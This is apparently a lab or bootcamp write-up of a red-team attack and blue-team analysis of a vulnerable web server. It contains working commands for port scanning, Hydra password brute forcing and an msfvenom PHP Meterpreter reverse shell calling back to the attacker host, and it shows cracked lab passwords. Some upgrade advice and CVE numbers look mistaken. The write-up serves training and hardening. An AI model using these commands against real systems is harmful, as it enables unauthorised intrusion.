# Red Team vs Blue Team Analysis
Assessment, Analysis, and Hardening of a Vulnerable System

## Network Topology
------
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED%20VS%20BLUE%20NETWORK.png)

## Red Team Penetration Test
------
Network scan to discover target IP

`netdiscover -r 192.168.1.0/24`

| Machine               |     IP        |
| --------------------- |:-------------:|
| Hyper-V               | 192.168.1.1   |
| Kali Linux (Attacker) | 192.168.1.90  |
| Capstone (Target)     | 192.168.1.105 |
| ELK Server            | 192.168.1.100 |

## Simple scan for open ports
`nmap 192.168.1.105`

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/6.PNG)

| Port      | Service  |
| --------- |:--------:|
| 22        | ssh      |
| 80        | http     |

## Agressive scan for more information
`nmap -vvv 192.168.1.105`

Output shows a webserver directory with interesting files listed such as *ashton* and *hannah* text files.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/22.png)

## Webserver Navigation
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/7.PNG)

I then find a text file that lists some new employees and their positions. One person in particuler is Ryan, the new CEO, he may have the highest level access.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/23.png)

Further investigation through the folders leads to a text file within the *company_folders/company_culture* path. This also mentions an interesting hidden folder I did not see earlier, titled *secret_folder*.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/24.png)

## Directory Traversal
Using the new found knowledge of the existance of the *secret_folder*, I use directory traversal in the webserver URL to gain access. A login screen displays stating *For ashtons eyes only*. Knowing now the user name that has access, I must bruteforce attack to gain access.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/8.PNG)

## Vulnerability Scanning
Before launching any attacks, I wanted to perform a vulnerability scan to identify any known vulnerabilities.

`nmap -A --script=vuln -vvv 192.168.1.105`

  * Webdav vulnerability
  * SQL Injection vulnerability across all directories
  * CVE-2017-15710 – Apache httpd vulnerability
  
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/25.png)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/26.png)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/27.png)

## Launching Brute Force Attack
We know that Ashton has access to the *secret_folder*, as stated when attempting to login. So I utilized the Hydra tool to launch the attack with the commonly used passwords list.

`hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/10.PNG)

Password has been found to be *leopoldo*

## SSH into webserver using Ashton's login info

`ssh ashton@192.168.1.105`
 
Once logged in I notice something sitting in the *home* directory.
 
### Flag1
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/28.png)
 
## Password Hash Found
Once I gain access, I click on the file *connect_to_corp_server* to look at the contents. The file contains the step-by-step instructions to connect to server and Ryan's password *hash*.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/11.PNG)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/12.PNG)

I take the md5 hash and crack it using a free online tool named *Crackstation*. 
Password is *linux4u*

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/13.PNG)

## Logging into WebDav with Ryan's credentials.
Once I gained access, I notice another file of interest called *passwd.dav*.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/29.png)

## Creating a Reverse Shell
In order to create a reverse shell, I utilized msfvenom to create a payload php file containing a shell script.

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/15.PNG)

I then dragged and dropped the shell.php file into the *network:///dav://192.168.1.105/webdav* using the file manager.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/14.PNG)

## Setting up a listener using Metasploit
`msfconsole`
`use multi/handler`

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/17.PNG)

I then go back into the webserver, as Ryan, and click on the *shell.php* file to initiate the connection witht he listener.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/18.PNG)

I switch back to Metasploit to confirm connection and that a Meterpreter session has been opened.

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/19.PNG)

## Creating Interactive Shell
`python -c 'import pty; pty.spawn("/bin/bash")`

### Flag2
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/20.PNG)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/21.PNG)

## Exfiltration
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/30.png)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/31.png)

## Vulnerabilities
### Webservers
1. Directory listing vulnerability. Webserver directories are open to the public and navigable in a browser.
CWE-548: Exposure of Information Through Directory Listing

https://cwe.mitre.org/data/definitions/548.html

  * Attackers can gather a lot of information from open directories. They can use this information and access to launch attacks and upload malicious content. These directories may also be vulnerable to path traversal in which users can navigate across to sensitive regions of the system.
  * Disable the ability to view directories in the browser, and disable access/password protect all directories to avoid path traversal. Sanitise input to avoid malicious SQL statements.
2. SQL Injection. Nmap revealed a possible vulnerability to SQL injection to the directories in the webserver.
  * This can allow attackers to enter malicious code and gain access or launch attacks.
  * Sanitise inputs.
3. Documents with usernames in plain text are available to the public in the webserver
CWE-312: Cleartext Storage of Sensitive Information

https://cwe.mitre.org/data/definitions/312.html

CWE-256: Unprotected Storage of Credentials

https://cwe.mitre.org/data/definitions/256.html

  * Attackers can use this information in bruteforce attacks. Even just one name can lead to a system breach.
  * Users should not be using their own names as usernames. User names should not be published anywhere, especially not a webserver.
4. Documents in the webserver give direct reference to a hidden directory with sensitive data.
  * These are breadcrumbs that attackers will follow, with a direct reference to a hidden directory attackers can focus attacks to access the contents of the directory.
  * Do not reference sensitive directories in publicly available documents. If it is necessary to mention it, then encrypt and password protect.
5. Webdav is enabled and allows uploading of malicious script.
CWE-434: Unrestricted Upload of File with Dangerous Type

https://cwe.mitre.org/data/definitions/434.html

  * It is easy to create a shell in the target system using a reverse shell, by opening a meterpreter session
  * Disable webdav
6. Missing encryption of sensitive data.
CWE-311: Missing Encryption of Sensitive Data

https://cwe.mitre.org/data/definitions/311.html

7. CWE-522: Insufficiently Protected Credentials

### Users and Passwords
1. Usernames are employee first names.
  * These are too obvious and most likely discoverable through Google Dorking. All are high level employees of the company which are more vulnerable, and certainly easier to find in the company structure in publicly available material.

  * Attackers can (with very little investigation) create a wordlist of usernames of employees for bruteforcing.
  * Usernames should not include the person's name.
2. Ryan's password hash was printed into a document, publicly available on the webserver.
  * The password hash is highly confidential and vulnerable once an attacker can access it.

CWE-256: Unprotected Storage of Credentials

https://cwe.mitre.org/data/definitions/256.html

  * A password hash is one of the highest targets for an attacker that is trying to gain entry; being able to navigate to one in a browser through minimal effort is a critical vulnerability.
  * Password hashes should remain in the /etc/shadow directory with root only access in the system, and not be published or copied anywhere.
3. CWE-759: Use of a One-Way Hash without a Salt.
https://cwe.mitre.org/data/definitions/759.html

CWE-916: Use of Password Hash With Insufficient Computational Effort

https://cwe.mitre.org/data/definitions/916.html

  * Ryan's password is only hashed, but not salted. A password hash can be run through apps to crack the password, however a salted hash will be almost impossible to crack.

  * A simple hash can be cracked with tools in linux or through websites, in this case it took seconds to crack Ryan's hash.
  * Salt hashes.
4. CWE-521: Weak Password Requirements.
https://cwe.mitre.org/data/definitions/521.html

  * Passwords need to have a minimum requirement of password length and use of mixed characters and case.

  * *linux4u* is a simple phrase with very common word substitution – 4=for, u=you. and leopoldo is a common name that could easily be bruteforced with a common password list.
  * Require strong passwords that exclude phrases and names, minimum 8 characters, mixed characters that include a combination of lower case, upper case, special characters and numbers.
  * Consider implementing multi-factor authentication.

### Apache 2.4.29
1. CVE-2017-15710
  * This potential Apache httpd vulnerability was picked up by nmap and relates to a configuration that verifies user credentials; a particular header value is searched for and if it is not present in the charset conversion table, it reverts to a fallback of 2 characters (eg. en-US becomes en). While this risk is unlikely, if there is a header value of less than 2 characters, the system may crash.

  * This vulnerability has the potential to force a Denial of Service attack.
  * As this vulnerability applies to a range of Apache httpd versions from 2.0.23 to 2.4.29, upgrading to the latest version 2.2.46 may mitigate this risk.
2. CVE-2018-1312
  * While this vulnerability wasn't picked up in any scans, the apache version remains vulnerable. From cve-mitre "When generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection."

  * With this vulnerability, an attacker would be able to replay HTTP requests across a cluster of servers (that are using a common Digest authentication configuration), whilst avoiding detection.
  * Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
3. CVE-2017-1283
  * Mod_session is configured to forward its session data to CGI applications

  * With this vulnerability, a remote user may influence their content by using a "Session" header.
  * Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
4. CVE-2017-15715
  * This vulnerability relates to malicious filenames, in which the end of filenames can be matched/replaced with '$'

  * In systems where file uploads are externally blocked, this vulnerability can be exploited to upload malicious files
  * Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
  
------

# Blue Team
------

## Identifying the port scan
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/Connections%20Overtime.PNG)

## Requests for the *secret_folder* and the amount of time the reverse shell was used.
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/TOP%2010%20HTTP.PNG)

## Filtering for Brute Force Attacks
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/BRUTE%20FORCE%20CONFIRMED.PNG)

------

## Recommended Alarms and Mitigation Strategies

![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/mit1.PNG)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/mit2.PNG)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/mit3.PNG)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/mit4.PNG)
![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/mit5.PNG)
